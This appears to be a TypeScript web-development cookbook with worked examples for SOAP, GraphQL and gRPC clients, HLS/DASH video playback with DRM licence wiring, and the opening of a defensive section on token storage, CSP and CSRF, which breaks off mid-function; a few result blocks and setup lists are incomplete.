What goes over the wire

All four are "just HTTP" underneath; what differs is who defines the contract and what the client needs to speak it.

ProtocolRequestErrors arrive asContract and typesFrom a browser
RESTVerb + URL, usually JSONHTTP status + a body you defineOpenAPI (optional); validate with a schemafetch
SOAP 1.1POST of an XML envelope as text/xml, plus a SOAPAction headerHTTP 500 with a Fault: faultcode, faultstring, detailWSDL + XSD; generated clients are rare in TSfetch + DOMParser; needs CORS on the service
SOAP 1.2content-type: application/soap+xml; action="…" — no SOAPAction header; namespace http://www.w3.org/2003/05/soap-envelope400 (Sender) or 500 (Receiver) with Fault/Code/Value and Fault/Reason/TextWSDL 1.1 or 2.0 + XSDSame as 1.1
GraphQLPOST of { query, variables } to one endpointAn errors array beside data, usually with 200; request errors may be 4xx under application/graphql-response+jsonThe schema; types from GraphQL Code Generatorfetch, or a client (Apollo, urql) for caching
gRPCHTTP/2 + Protocol Buffers, one path per methodA status code (NOT_FOUND, DEADLINE_EXCEEDED…) in trailers.proto files → generated stubsNot directly: gRPC-Web or Connect through a proxy or a Connect server

SOAP: build the envelope, POST it, read the response

Reach for this when a carrier, bank or ERP only speaks SOAP: escape every value you interpolate, send the 1.1 headers, and parse with namespace prefixes stripped.

import { createServer } from "node:http";
import { once } from "node:events";
import { text } from "node:stream/consumers";
import type { AddressInfo } from "node:net";
import { XMLParser } from "fast-xml-parser";

const SOAP11 = "http://schemas.xmlsoap.org/soap/envelope/";

// Values stay strings (you decide the types); attributes are kept as "@_name".
const parser = new XMLParser({ removeNSPrefix: true, parseTagValue: false, ignoreAttributes: false });

const server = createServer(async (req, res) => {             // stands in for the carrier's endpoint
  const { Postcode, WeightKg } = parser.parse(await text(req)).Envelope.Body.GetRate;
  console.log(`carrier received ${req.headers.soapaction} for "${Postcode}"`);
  const rate = `<Rate currency="EUR">${(4.5 + 1.2 * Number(WeightKg)).toFixed(2)}</Rate>`;
  res.writeHead(200, { "content-type": "text/xml; charset=utf-8" }).end(`<s:Envelope xmlns:s="${SOAP11}">` +
    `<s:Body><GetRateResponse xmlns="urn:carrier">${rate}</GetRateResponse></s:Body></s:Envelope>`);
}).listen(0, "127.0.0.1");
await once(server, "listening");
const endpoint = `http://127.0.0.1:${(server.address() as AddressInfo).port}/RateService.asmx`;

const ENTITIES: Record<string, string> = {
  "<": "&lt;", ">": "&gt;", "&": "&amp;", "'": "&apos;", '"': "&quot;",
};
const xml = (value: string | number) => String(value).replace(/[<>&'"]/g, (c) => ENTITIES[c]!);

async function getRate(postcode: string, weightKg: number): Promise<{ amount: number; currency: string }> {
  const envelope = `<soap:Envelope xmlns:soap="${SOAP11}">
  <soap:Body>
    <GetRate xmlns="urn:carrier">
      <Postcode>${xml(postcode)}</Postcode><WeightKg>${xml(weightKg)}</WeightKg>
    </GetRate>
  </soap:Body>
</soap:Envelope>`;
  const response = await fetch(endpoint, {
    method: "POST",
    headers: { "content-type": "text/xml; charset=utf-8", soapaction: '"urn:carrier/GetRate"' },   // SOAP 1.1
    body: envelope,
  });
  const rate = parser.parse(await response.text()).Envelope?.Body?.GetRateResponse?.Rate;
  if (!response.ok || rate === undefined) throw new Error(`GetRate failed: HTTP ${response.status}`);
  return { amount: Number(rate["#text"]), currency: String(rate["@_currency"]) };
}

console.log(await getRate("10115 <Mitte> & Co", 5));
server.close();
Result
carrier received "urn:carrier/GetRate" for "10115 <Mitte> & Co"
{ amount: 10.5, currency: 'EUR' }

SOAP: turn a Fault into a typed error

A fault comes back as HTTP 500 with an envelope, so parse the body before you look at the status — here with DOMParser, the browser's parser, which jsdom provides in Node.

import { JSDOM } from "jsdom";

const { DOMParser } = new JSDOM().window;           // in a browser: delete this line
const SOAP11 = "http://schemas.xmlsoap.org/soap/envelope/";

const send = async (_url: string, _init: RequestInit) => new Response(   // the carrier, stubbed
  `<s:Envelope xmlns:s="${SOAP11}"><s:Body><s:Fault><faultcode>s:Client</faultcode>` +
  `<faultstring>Weight exceeds 30 kg</faultstring><detail><MaxKg>30</MaxKg></detail>` +
  `</s:Fault></s:Body></s:Envelope>`,
  { status: 500, headers: { "content-type": "text/xml; charset=utf-8" } });

class SoapFault extends Error {
  code: string;

  constructor(code: string, message: string) {
    super(message);
    this.code = code;
  }
}

function soapBody(xml: string): Element {
  const doc = new DOMParser().parseFromString(xml, "text/xml");
  if (doc.querySelector("parsererror")) throw new Error("response is not XML");
  const body = doc.getElementsByTagNameNS(SOAP11, "Body")[0];
  const fault = body?.getElementsByTagNameNS(SOAP11, "Fault")[0];
  if (fault) {
    const field = (tag: string) => fault.getElementsByTagName(tag)[0]?.textContent ?? "";   // unqualified
    throw new SoapFault(field("faultcode"), field("faultstring"));
  }
  if (!body?.firstElementChild) throw new Error("empty SOAP body");
  return body.firstElementChild;
}

const envelope = `<soap:Envelope xmlns:soap="${SOAP11}"><soap:Body>` +
  `<GetRate xmlns="urn:carrier"><WeightKg>45</WeightKg></GetRate></soap:Body></soap:Envelope>`;
const response = await send("https://carrier.example/RateService.asmx", {
  method: "POST",
  headers: { "content-type": "text/xml; charset=utf-8", soapaction: '"urn:carrier/GetRate"' },
  body: envelope,
});

try {
  soapBody(await response.text());                  // parse first: the status alone says nothing useful
} catch (e) {
  if (!(e instanceof SoapFault)) throw e;
  console.log(response.status, e.code, "—", e.message);   // s:Client: fix the request; s:Server: retry
}
Result
500 s:Client — Weight exceeds 30 kg

GraphQL: a typed query with variables over fetch

Variables travel beside the query, never spliced into it, and the result type is declared per operation (GraphQL Code Generator writes these for you from the schema).

import { buildSchema, graphql } from "graphql";

const schema = buildSchema(`
  type Product { id: ID!, name: String!, priceCents: Int! }
  type Query { products(category: String!, first: Int!): [Product!]! }`);

const CATALOG = [
  { id: "p1", name: "Mug", priceCents: 1200, category: "kitchen" },
  { id: "p2", name: "Tote", priceCents: 1800, category: "bags" },
  { id: "p3", name: "Kettle", priceCents: 4500, category: "kitchen" },
];
const rootValue = {
  products: ({ category, first }: { category: string; first: number }) =>
    CATALOG.filter((p) => p.category === category).slice(0, first),
};

// The shop's endpoint, run in-process as an injected transport; omit it and gql() uses fetch.
type Fetch = (url: string, init: RequestInit) => Promise<Response>;
const shopEndpoint: Fetch = async (_url, init) => {
  const { query, variables } = JSON.parse(String(init.body));
  return Response.json(await graphql({ schema, source: query, variableValues: variables, rootValue }));
};

type GraphQLResponse<T> = { data?: T | null; errors?: { message: string; path?: (string | number)[] }[] };

async function gql<T>(query: string, variables: object, send: Fetch = fetch): Promise<GraphQLResponse<T>> {
  const response = await send("https://shop.example/graphql", {
    method: "POST",
    headers: { "content-type": "application/json", accept: "application/graphql-response+json" },
    body: JSON.stringify({ query, variables }),          // variables beside the query, never spliced in
  });
  if (!response.headers.get("content-type")?.includes("json")) throw new Error(`HTTP ${response.status}`);
  return response.json();                            // a 4xx with a JSON body still carries `errors`
}

const PRODUCTS = /* GraphQL */ `
  query Products($category: String!, $first: Int!) {
    products(category: $category, first: $first) { id name priceCents }
  }`;
type ProductsQuery = { products: { id: string; name: string; priceCents: number }[] };

const { data, errors } = await gql<ProductsQuery>(PRODUCTS, { category: "kitchen", first: 5 }, shopEndpoint);
if (errors?.length) throw new Error(errors.map((e) => e.message).join("; "));
for (const product of data?.products ?? []) {
  console.log(product.id, product.name, (product.priceCents / 100).toFixed(2));
}
Result
p1 Mug 12.00
p3 Kettle 45.00
Setup
  1. Node.js 22.18 or later (it runs .mts files directly by stripping the types)
  2. npm i graphql (only for the in-process stand-in endpoint — the client is plain fetch)
  3. Save as main.mts and run node main.mts

GraphQL: a mutation, and errors beside data

A GraphQL response can be a partial success: read errors even when data is present, and branch on extensions.code, not on the message text.

import { buildSchema, graphql, GraphQLError } from "graphql";

const schema = buildSchema(`
  type Cart { itemCount: Int! }
  type Query { cart: Cart! }
  type Mutation { addToCart(productId: ID!, quantity: Int!): Cart }`);

const STOCK: Record<string, number> = { p1: 3 };
let itemCount = 0;
const rootValue = {
  cart: () => ({ itemCount }),
  addToCart: ({ productId, quantity }: { productId: string; quantity: number }) => {
    const left = STOCK[productId] ?? 0;
    const extensions = { code: "OUT_OF_STOCK" };      // a machine-readable code for clients to branch on
    if (quantity > left) throw new GraphQLError(`Only ${left} left`, { extensions });
    STOCK[productId] = left - quantity;
    return { itemCount: (itemCount += quantity) };
  },
};

// The transport is injected: the client below is exactly what talks to a real endpoint.
const send = async (_url: string, init: RequestInit) => {
  const { query, variables } = JSON.parse(String(init.body));
  return Response.json(await graphql({ schema, source: query, variableValues: variables, rootValue }));
};

type GqlError = { message: string; path?: (string | number)[]; extensions?: { code?: string } };
type AddToCart = { addToCart: { itemCount: number } | null };
const ADD_TO_CART = /* GraphQL */ `
  mutation AddToCart($productId: ID!, $quantity: Int!) {
    addToCart(productId: $productId, quantity: $quantity) { itemCount }
  }`;

async function addToCart(productId: string, quantity: number): Promise<string> {
  const body = JSON.stringify({ query: ADD_TO_CART, variables: { productId, quantity } });
  const response = await send("/graphql", { method: "POST", body });
  const { data, errors } = (await response.json()) as { data?: AddToCart | null; errors?: GqlError[] };
  const outOfStock = errors?.find((e) => e.extensions?.code === "OUT_OF_STOCK");
  if (outOfStock) return `refused at ${outOfStock.path?.join(".")}: ${outOfStock.message}`;
  if (errors?.length || !data?.addToCart) return `failed: ${errors?.[0]?.message ?? "no data"}`;
  return `cart now holds ${data.addToCart.itemCount}`;
}

console.log(await addToCart("p1", 2));
console.log(await addToCart("p1", 5));
console.log(await addToCart("p1", "two" as unknown as number));   // an unchecked form value: no data at all
Result
cart now holds 2
refused at addToCart: Only 1 left
failed: Variable "$quantity" has invalid value: Int cannot represent non-integer value: "two"

gRPC from a browser: Connect and gRPC-Web

Browsers cannot speak raw gRPC (no HTTP/2 trailers), so a Connect client calls a Connect server, or a gRPC-Web transport calls through a proxy such as Envoy — same generated stub, same code.

import { createClient, ConnectError, Code } from "@connectrpc/connect";
import { createConnectTransport, createGrpcWebTransport } from "@connectrpc/connect-web";
import { OrderService, OrderStatus } from "./gen/shop/v1/orders_pb.js";   // generated by protoc-gen-es

const baseUrl = "https://api.shop.example";
const SERVER_SPEAKS_CONNECT = true;                    // connect-go, connect-node, connect-es servers
const transport = SERVER_SPEAKS_CONNECT
  ? createConnectTransport({ baseUrl })                // the server answers the browser directly
  : createGrpcWebTransport({ baseUrl });               // a plain gRPC server behind Envoy's gRPC-Web filter
const orders = createClient(OrderService, transport);

export async function showOrder(id: string): Promise<string> {
  try {
    const order = await orders.getOrder({ id }, { timeoutMs: 2_000 });   // unary call with a deadline
    return `${order.id}: ${OrderStatus[order.status]}`;          // protobuf enums are numeric TS enums
  } catch (err) {
    const e = ConnectError.from(err);
    if (e.code === Code.NotFound) return "No such order";
    if (e.code === Code.DeadlineExceeded || e.code === Code.Unavailable) return "Try again";
    throw e;
  }
}

export async function followOrder(id: string, signal: AbortSignal, onUpdate: (status: OrderStatus) => void) {
  try {
    for await (const update of orders.watchOrder({ id }, { signal })) onUpdate(update.status);   // a stream
  } catch (err) {
    if (ConnectError.from(err).code !== Code.Canceled) throw err;   // aborting the signal ends the stream
  }
}
Result

showOrder resolves to the order's status or a friendly message per status code; followOrder reports each status update until the server ends the stream or the signal aborts.

Setup
  1. npm i @connectrpc/connect @connectrpc/connect-web @bufbuild/protobuf, and @bufbuild/protoc-gen-es + @bufbuild/buf as dev dependencies
  2. Generate gen/shop/v1/orders_pb.ts from orders.proto with npx buf generate (plugin es, target=ts)
  3. A bundler (Vite, esbuild) serving the page; a server that speaks Connect or gRPC-Web, with CORS for the page's origin

gRPC in Node: @grpc/grpc-js with generated types

Service-to-service calls from Node: give every call an absolute deadline, switch on grpc.status codes, and listen for error on a stream or it crashes the process.

import * as grpc from "@grpc/grpc-js";
import * as protoLoader from "@grpc/proto-loader";
import type { ProtoGrpcType } from "./gen/orders.ts";
import type { Order__Output } from "./gen/shop/v1/Order.ts";

const options = { longs: String, enums: String, defaults: true, oneofs: true };   // match the gen-types flags
const definition = protoLoader.loadSync("orders.proto", options);
const proto = grpc.loadPackageDefinition(definition) as unknown as ProtoGrpcType;
const client = new proto.shop.v1.OrderService("orders.internal:50051", grpc.credentials.createSsl());

const deadlineIn = (ms: number) => new Date(Date.now() + ms);   // a deadline is a point in time

function getOrder(id: string): Promise<Order__Output> {
  return new Promise((resolve, reject) =>
    client.getOrder({ id }, { deadline: deadlineIn(2_000) }, (err, order) =>
      err || !order ? reject(err ?? new Error("empty response")) : resolve(order)));
}

try {
  console.log((await getOrder("o-1")).status);
} catch (e) {
  const err = e as grpc.ServiceError;
  if (err.code === grpc.status.NOT_FOUND) console.log("no such order");
  else if (err.code === grpc.status.DEADLINE_EXCEEDED) console.log("orders service too slow");
  else throw err;
}

const updates = client.watchOrder({ id: "o-1" }, { deadline: deadlineIn(60_000) });
const stopWatching = setTimeout(() => updates.cancel(), 30_000);   // the caller stopped caring
updates.on("data", (update: Order__Output) => console.log("status:", update.status));
updates.on("error", (err: grpc.ServiceError) => {   // without this listener an error crashes the process
  if (err.code !== grpc.status.CANCELLED) console.error(grpc.status[err.code], err.details);
});
updates.on("status", () => {                                   // emitted once, however the call ended
  clearTimeout(stopWatching);
  client.close();
});
Result

Prints the order's status (or no such order / orders service too slow), then each streamed status update until the stream ends or is cancelled after 30 seconds.

Setup
  1. npm i @grpc/grpc-js @grpc/proto-loader
  2. Generate types: npx proto-loader-gen-types --longs=String --enums=String --defaults --oneofs --grpcLib=@grpc/grpc-js --outDir=gen orders.proto
  3. A gRPC server for shop.v1.OrderService (unary GetOrder, server-streaming WatchOrder)

Choosing between REST, SOAP, gRPC and GraphQL

Usually the other side has already chosen; when it is yours to choose, choose by who the clients are.

PickWhenStrengthCost
REST + JSONPublic or partner APIs; browsers; anything cacheableHTTP caching, CDNs, every tool understands itOver- and under-fetching; the contract is yours to document
GraphQLMany screens with different data needs over one backendClient picks fields; one round trip; a typed schemaNo HTTP caching by URL; query cost limits; N+1 on the server
gRPCService-to-service inside your network; streamingCompact binary, generated stubs, deadlines and streaming built inBrowsers need gRPC-Web or Connect; payloads unreadable without the .proto
SOAPIntegrating an existing enterprise, banking or government serviceWS-Security and formal contracts (WSDL) those systems expectVerbose XML, weak TS tooling — wrap it behind your own typed function

Rules worth saying out loud

The protocol-specific traps behind most integration bugs.

  • Interpolating values into a SOAP envelope or a GraphQL query string. Escape XML; pass GraphQL variables.
  • Checking only response.ok. A SOAP fault is a 500 with a body to read; a GraphQL failure is often a 200 with errors.
  • GraphQL: treat data and errors as independent — partial data with errors is a normal response.
  • gRPC: every call gets a deadline; the default is none, so a stuck server holds the call forever.
  • Branch on machine codes (faultcode, extensions.code, grpc.status), never on human-readable messages.
  • Keep the protocol behind one typed function per operation; the rest of the app should not know a call is SOAP.
  • Generated code (protoc-gen-es, proto-loader-gen-types, GraphQL Code Generator) is the source of truth for types; regenerate in CI.

What a multivariant playlist holds, and how ABR picks

The multivariant playlist (like a DASH MPD's Representations) lists renditions by bandwidth, resolution and codecs plus the audio groups, and the player picks the best one that fits the measured throughput with headroom and the player's size.

const MULTIVARIANT = `#EXTM3U
#EXT-X-MEDIA:TYPE=AUDIO,GROUP-ID="aac",NAME="English",LANGUAGE="en",DEFAULT=YES,URI="audio/en.m3u8"
#EXT-X-STREAM-INF:BANDWIDTH=800000,RESOLUTION=640x360,CODECS="avc1.4d401e,mp4a.40.2",AUDIO="aac"
360p.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=2500000,RESOLUTION=1280x720,CODECS="avc1.4d401f,mp4a.40.2",AUDIO="aac"
720p.m3u8
#EXT-X-STREAM-INF:BANDWIDTH=6000000,RESOLUTION=1920x1080,CODECS="avc1.640028,mp4a.40.2",AUDIO="aac"
1080p.m3u8`;

type Rendition = { bandwidth: number; height: number; uri: string };

function attributes(line: string): Map<string, string> {
  const attrs = new Map<string, string>();
  for (const [, key, quoted, bare] of line.matchAll(/([A-Z0-9-]+)=(?:"([^"]*)"|([^,]*))/g)) {
    attrs.set(key!, quoted ?? bare ?? "");          // KEY="quoted" or KEY=bare
  }
  return attrs;
}

function parseMultivariant(text: string) {
  const lines = text.split("\n").map((l) => l.trim());
  const renditions: Rendition[] = [];
  const media: string[] = [];
  lines.forEach((line, i) => {
    const attrs = attributes(line);
    if (line.startsWith("#EXT-X-STREAM-INF:")) {
      const height = Number(attrs.get("RESOLUTION")?.split("x")[1] ?? 0);
      renditions.push({ bandwidth: Number(attrs.get("BANDWIDTH")), height, uri: lines[i + 1] ?? "" });
    } else if (line.startsWith("#EXT-X-MEDIA:")) {
      media.push(`${attrs.get("TYPE")}:${attrs.get("LANGUAGE")}`);
    }
  });
  return { renditions: renditions.toSorted((a, b) => a.bandwidth - b.bandwidth), media };
}

function chooseRendition(renditions: Rendition[], measuredBps: number, playerHeight: number): Rendition {
  const fits = renditions.filter((r) => r.bandwidth <= measuredBps * 0.8 && r.height <= playerHeight);
  return fits.at(-1) ?? renditions[0]!;           // nothing fits: the lowest, not a stall
}

const { renditions, media } = parseMultivariant(MULTIVARIANT);
console.log(renditions.map((r) => `${r.height}p@${r.bandwidth / 1000}k`).join(" "), "|", media.join(" "));
for (const [mbps, height] of [[1.5, 1080], [4, 1080], [9, 1080], [9, 720], [0.3, 1080]] as const) {
  console.log(`${mbps} Mbps, ${height}px player ->`, chooseRendition(renditions, mbps * 1e6, height).uri);
}
Result

9 Mbps, 1080px player -> 1080p.m3u8
9 Mbps, 720px player -> 720p.m3u8

Play HLS with hls.js, falling back to native

Use hls.js wherever Media Source exists (it gives you ABR control and events), video.src with the .m3u8 only where native HLS is all there is, and always return a cleanup.

import Hls from "hls.js";

export function playStream(video: HTMLVideoElement, src: string): () => void {
  if (Hls.isSupported()) {                         // MediaSource or ManagedMediaSource is available
    const hls = new Hls({ capLevelToPlayerSize: true });   // no 1080p into a 360-px player
    hls.on(Hls.Events.MANIFEST_PARSED, (_event, data) => {
      const heights = data.levels.map((level) => level.height);
      console.log(`${data.levels.length} renditions, up to ${Math.max(...heights)}p`);
    });
    hls.loadSource(src);
    hls.attachMedia(video);
    return () => hls.destroy();                    // stops loading and frees the SourceBuffers
  }
  if (video.canPlayType("application/vnd.apple.mpegurl")) {
    video.src = src;                               // the browser does HLS (and ABR) itself
    return () => {
      video.removeAttribute("src");
      video.load();                                // actually releases the stream
    };
  }
  throw new Error("This browser cannot play HLS");
}

const video = document.querySelector<HTMLVideoElement>("#player")!;
const stop = playStream(video, "https://media.example/courses/intro/master.m3u8");
window.addEventListener("pagehide", stop, { once: true });
Result

The lesson plays: through hls.js in Chrome, Firefox, Edge and Safari on macOS (logging 3 renditions, up to 1080p), natively on iPhones without Media Source.

Player state, buffering and error recovery

Model the UI as one state union, offer Retry once hls.js has spent its own load retries instead of looping, rebuild the media pipeline at most once per 5 s, and remove every listener on teardown.

import Hls from "hls.js";

export type PlayerState =
  | { kind: "loading" }
  | { kind: "playing"; height: number }
  | { kind: "buffering" }
  | { kind: "failed"; reason: string; retry?: () => void };

export function attachPlayer(video: HTMLVideoElement, src: string, render: (s: PlayerState) => void) {
  const hls = new Hls();                             // network retries: fragLoadPolicy, playlistLoadPolicy
  const listeners = new AbortController();           // one abort removes every video listener
  const teardown = () => {
    listeners.abort();
    hls.destroy();
  };

  let height = 0;
  let lastMediaRecovery = -Infinity;
  render({ kind: "loading" });
  video.addEventListener("waiting", () => render({ kind: "buffering" }), { signal: listeners.signal });
  video.addEventListener("playing", () => render({ kind: "playing", height }), { signal: listeners.signal });
  hls.on(Hls.Events.LEVEL_SWITCHED, (_event, data) => {
    height = hls.levels[data.level]?.height ?? 0;  // ABR moved to another rendition
    if (!video.paused) render({ kind: "playing", height });
  });

  hls.on(Hls.Events.ERROR, (_event, data) => {
    if (!data.fatal) return;                       // hls.js already retries these
    if (data.type === Hls.ErrorTypes.MEDIA_ERROR && performance.now() - lastMediaRecovery > 5_000) {
      lastMediaRecovery = performance.now();
      return hls.recoverMediaError();              // a decode/append error: rebuild once per 5 s at most
    }
    if (data.type === Hls.ErrorTypes.NETWORK_ERROR) {   // its retry policy is spent: let the user decide
      // No levels yet means the manifest itself failed: load it again rather than resume.
      const retry = () => (hls.levels.length === 0 ? hls.loadSource(src) : hls.startLoad());
      return render({ kind: "failed", reason: data.details, retry });
    }
    teardown();
    render({ kind: "failed", reason: data.details });
  });

  hls.loadSource(src);
  hls.attachMedia(video);
  return teardown;                                   // call when the view goes away
}
Result

The UI moves through loading → playing (with the current height) ⇄ buffering; an outage that outlasts hls.js's retries shows failed with a Retry action (reloading the manifest if it never arrived), a decode error recovers at most once per 5 s, anything else tears the player down; the returned function removes the listeners and destroys hls.

Live versus on-demand, and low latency

A playlist without #EXT-X-ENDLIST is live: it is reloaded, its window slides, and the UI needs a live badge and a "go to live" button instead of a full scrub bar.

import Hls from "hls.js";

const video = document.querySelector<HTMLVideoElement>("#player")!;
const liveBadge = document.querySelector<HTMLElement>("#live-badge")!;
const goLive = document.querySelector<HTMLButtonElement>("#go-live")!;

const hls = new Hls({
  lowLatencyMode: true,          // LL-HLS: partial segments and blocking reloads, when the stream has them
  liveSyncDurationCount: 3,      // regular live: stay three segments behind the edge
  backBufferLength: 30,          // keep 30 s behind the playhead — a three-hour stream must not fill memory
});

hls.on(Hls.Events.LEVEL_LOADED, (_event, { details }) => {
  liveBadge.hidden = !details.live;
  goLive.hidden = !details.live;
  if (!details.live) console.log(`on demand: ${Math.round(details.totalduration)} s`);
});

goLive.addEventListener("click", () => {
  if (hls.liveSyncPosition !== null) video.currentTime = hls.liveSyncPosition;   // jump back to the edge
});

video.addEventListener("timeupdate", () => {
  if (!liveBadge.hidden) liveBadge.title = `${hls.latency.toFixed(1)} s behind live`;
});

hls.loadSource("https://media.example/events/keynote/master.m3u8");
hls.attachMedia(video);
Result

For the live keynote the badge and Go live button appear and the badge's tooltip shows the latency; for an on-demand lesson they stay hidden and its duration is logged.

  2. A page containing <video id="player" controls playsinline></video>; the stream's origin must send CORS headers for the page (hls.js fetches playlists and segments itself)
  3. Bundle with Vite or esbuild and load the output with <script type="module">

Captions and audio tracks

Alternate audio and subtitles are separate renditions that hls.js exposes as track lists you bind to menus, with subtitleTrack = -1 for captions off.

import Hls, { type MediaPlaylist } from "hls.js";

const video = document.querySelector<HTMLVideoElement>("#player")!;
const audioMenu = document.querySelector<HTMLSelectElement>("#audio")!;
const captionMenu = document.querySelector<HTMLSelectElement>("#captions")!;

function fill(menu: HTMLSelectElement, tracks: MediaPlaylist[], selected: number, offLabel?: string) {
  const options = tracks.map((t) => new Option(t.lang ? `${t.name} (${t.lang})` : t.name, String(t.id)));
  menu.replaceChildren(...(offLabel ? [new Option(offLabel, "-1")] : []), ...options);
  menu.value = String(selected);
}

const hls = new Hls({ renderTextTracksNatively: true });   // captions as the video's own text tracks
hls.on(Hls.Events.AUDIO_TRACKS_UPDATED, (_event, { audioTracks }) =>
  fill(audioMenu, audioTracks, hls.audioTrack));
hls.on(Hls.Events.SUBTITLE_TRACKS_UPDATED, (_event, { subtitleTracks }) =>
  fill(captionMenu, subtitleTracks, hls.subtitleTrack, "Captions off"));

audioMenu.addEventListener("change", () => (hls.audioTrack = Number(audioMenu.value)));
captionMenu.addEventListener("change", () => (hls.subtitleTrack = Number(captionMenu.value)));

hls.loadSource("https://media.example/courses/intro/master.m3u8");
hls.attachMedia(video);

// Native HLS (iPhone) exposes the same subtitles as `video.textTracks`:
// for (const track of video.textTracks) track.mode = track.language === "es" ? "showing" : "disabled";
Result

The menus list English (en) and Español (es) audio and Captions off / English (en); choosing an item switches the audio rendition or the captions without restarting playback.

DASH with dash.js

DASH has no native player in any browser, so dash.js parses the MPD and feeds Media Source, with DRM data keyed by the same EME key-system names.

import { MediaPlayer } from "dashjs";

declare const viewerToken: string;                   // issued by your sign-in for this playback session
const video = document.querySelector<HTMLVideoElement>("#player")!;
const spinner = document.querySelector<HTMLElement>("#spinner")!;
const player = MediaPlayer().create();

const licenceHeaders = { authorization: `Bearer ${viewerToken}` };   // every licence server checks the viewer
player.setProtectionData({
  "com.widevine.alpha": {
    serverURL: "https://drm.example/widevine/license", httpRequestHeaders: licenceHeaders, priority: 0,
  },
  "com.microsoft.playready": {
    serverURL: "https://drm.example/playready/license", httpRequestHeaders: licenceHeaders, priority: 1,
  },
});

player.on(MediaPlayer.events.PLAYBACK_WAITING, () => (spinner.hidden = false));
player.on(MediaPlayer.events.PLAYBACK_PLAYING, () => (spinner.hidden = true));
player.on(MediaPlayer.events.ERROR, (event) => console.error("dash.js error", event));
const logLiveOnce = () => {                          // fires per period: a multi-period MPD would repeat it
  console.log("live:", player.isDynamic());          // a dynamic MPD (type="dynamic") is a live stream
  player.off(MediaPlayer.events.STREAM_INITIALIZED, logLiveOnce);
};
player.on(MediaPlayer.events.STREAM_INITIALIZED, logLiveOnce);

player.initialize(video, "https://media.example/courses/intro/manifest.mpd", false);   // false: no autoplay
window.addEventListener("pagehide", () => player.destroy(), { once: true });
Result

The DASH lesson plays through Media Source with a spinner while buffering; protected content requests a Widevine licence (preferred) or a PlayReady one, whichever the browser has, sending the viewer's token either way.

  2. A page containing <video id="player" controls playsinline></video>; the MPD and its segments served with CORS
  3. Bundle with Vite or esbuild and load the output with <script type="module">

DRM: which key system applies, and wiring it into hls.js

Encrypted Media Extensions is one API over three DRMs, so ask the browser which key system it has, give the player a licence URL per system, and send the viewer's credentials with every licence request — the CDM, not your code, decrypts.

import Hls from "hls.js";

declare const viewerToken: string;                 // issued by your sign-in for this playback session
const KEY_SYSTEMS = {
  "com.apple.fps": "FairPlay — Safari",
  "com.widevine.alpha": "Widevine — Chrome, Firefox, Edge, Android",
  "com.microsoft.playready": "PlayReady — Edge on Windows, many TVs",
};

async function availableKeySystem(): Promise<keyof typeof KEY_SYSTEMS | null> {
  const config: MediaKeySystemConfiguration[] = [{
    initDataTypes: ["cenc", "sinf", "skd"],
    videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.640028"' }],
  }];
  for (const keySystem of Object.keys(KEY_SYSTEMS) as (keyof typeof KEY_SYSTEMS)[]) {
    const access = await navigator.requestMediaKeySystemAccess(keySystem, config).catch(() => null);
    if (access) return keySystem;                  // a rejection (NotSupportedError) means: try the next one
  }
  return null;
}

const keySystem = await availableKeySystem();
console.log(keySystem ? KEY_SYSTEMS[keySystem] : "no DRM here: offer the clear (free preview) stream");

const hls = new Hls({
  emeEnabled: true,
  drmSystems: {
    "com.apple.fps": {
      licenseUrl: "https://drm.example/fps/license",
      serverCertificateUrl: "https://drm.example/fps/cert",
    },
    "com.widevine.alpha": { licenseUrl: "https://drm.example/widevine/license" },
    "com.microsoft.playready": { licenseUrl: "https://drm.example/playready/license" },
  },
  licenseXhrSetup: (xhr) => xhr.setRequestHeader("authorization", `Bearer ${viewerToken}`),   // who may watch
});
hls.loadSource("https://media.example/courses/premium/master.m3u8");
hls.attachMedia(document.querySelector<HTMLVideoElement>("#player")!);
Result

Logs the DRM this browser offers (e.g. Widevine — Chrome, Firefox, Edge, Android in Chrome) and plays the protected lesson after the licence request succeeds.

  2. A page containing <video id="player" controls playsinline></video>; the stream's origin must send CORS headers for the page (hls.js fetches playlists and segments itself)
  3. Bundle with Vite or esbuild and load the output with <script type="module">

Pitfalls worth saying out loud

The bugs that only show up on someone else's device.

  • Calling video.play() without handling its promise. Autoplay with sound is blocked: it rejects with NotAllowedError. Autoplay only muted + playsinline, or play from a click.
  • Forgetting CORS. hls.js and dash.js fetch playlists, segments and keys themselves, so the media origin must send Access-Control-Allow-Origin — native video.src does not need it.
  • hls.destroy() / player.destroy() when the view goes away; a leaked player keeps downloading and holds its SourceBuffers in memory.
  • Bound the buffers (backBufferLength, maxBufferLength) for long or live streams; MSE throws QuotaExceededError when they fill.
  • Offer the codecs every target decodes (H.264/AAC everywhere; HEVC and AV1 as extra renditions) and list them in CODECS so players skip what they cannot play.
  • Segment duration sets the floor for latency and the ceiling for ABR agility: 6 s segments mean roughly 20 s behind live; LL-HLS parts get it to 2–5 s.
  • DRM as access control. It stops casual copying; who may watch is decided by the licence server checking your own auth.

Where tokens live, OAuth with PKCE and rotating refresh, verifying JWTs, XSS, injection, CSP and CSRF, Web Crypto, Argon2id, passkeys, secrets — and what never reaches a log.

Where secrets and tokens live

Anything JavaScript can read an injected script can read, and anything sent automatically it can use, so store each secret by who must be able to read it.

PlaceInjected script can read it?Sent automatically?Use it for
HttpOnly; Secure; SameSite cookieNo (but XSS can still send requests that carry it)Yes, to its own site — hence CSRF defencesThe session, or the refresh token held by a backend-for-frontend (BFF)
A variable in memoryYes, while the page livesNoA short-lived access token; gone on reload, re-fetched with the cookie
localStorage / sessionStorageYes, for as long as it is stored (localStorage) or the tab lives (sessionStorage)NoNever tokens. UI preferences; the PKCE verifier only for the redirect round trip
Non-extractable CryptoKey in IndexedDBCan use it, cannot export itNoA device key for encrypting local drafts or proof-of-possession (DPoP)
Frontend build variables (VITE_*, NEXT_PUBLIC_*)Yes — they are inlined into the shipped bundle—Public identifiers only: a client ID, an analytics site key
Server environment / a secret managerNot from the browser—API keys, signing keys, database credentials — validated at startup

Session cookie, security headers and a CSRF check

The server sets a cookie scripts cannot read, sends headers that cut XSS and framing down, and signs in or accepts a cookie-authenticated write only when the browser proves the request came from the app's own origin.

import { createServer, type IncomingMessage } from "node:http";
import { once } from "node:events";
import type { AddressInfo } from "node:net";

const APP_ORIGIN = "https://app.shop.example";
const SESSION_COOKIE = "__Host-session=opaque-random-id; HttpOnly; Secure; SameSite=Lax; Path=/";

const CSP = "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; " +
  "frame-ancestors 'none'; require-trusted-types-for 'script'";   // the last is Baseline 2026

function mayWrite(req: IncomingMessage): boolean {
